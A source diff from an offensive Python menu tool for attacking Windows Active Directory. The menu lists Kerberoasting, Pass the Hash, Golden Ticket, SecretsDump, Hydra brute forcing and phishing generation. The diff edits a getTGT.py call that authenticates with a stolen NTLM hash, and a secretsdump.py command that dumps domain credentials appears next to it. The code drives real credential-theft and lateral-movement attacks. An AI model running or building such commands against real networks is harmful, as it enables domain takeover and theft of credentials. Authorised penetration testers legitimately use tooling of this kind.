@@ -593,8 +593,8 @@ def options():
    print('\u2551' + "(04) Re/Set WEBSITE URL (15) Who  DNS ADDRESS (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra HTTP (92) Telnet   " + '\u2551')
    print('\u2551' + "(05) Re/Set USER   NAME (16) Dig  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  SMB (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) Enum DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra POP3 (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Reco DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) Hydra  RDP (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) Hydra  TOM (96) MySQL    " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Reco DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenListPass (84) Hydra  RDP (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) GenPhishCod (85) Hydra  TOM (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live IPorts (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) MSFCon TOM (97) WinRm    " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap IP Services (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) MSFCon OWA (98) RemDesk  " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) MSFCon RCE (99) Exit     " + '\u2551')
@@ -2350,9 +2350,9 @@ while True:
          
          if (NTM[:1] != ""):
             print("[i] Using HASH value as password credential...")
-            command(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
+            command(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
             
-            if os.path.exists(USR.rstrip(" ") + "@" + TIP.rstrip(" ") + ".ccache"):
+            if os.path.exists(USR.rstrip(" ") + ".ccache"):
                print("[+] Checking TGT status...")
                TGT = privCheck(TGT)
          else:
@@ -2522,7 +2522,7 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         print("Enumerating, please wait...\n")
+         print("[*] Enumerating, please wait...\n")
          if PAS[:2] != "''":
             command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > secrets.tmp")
          else:
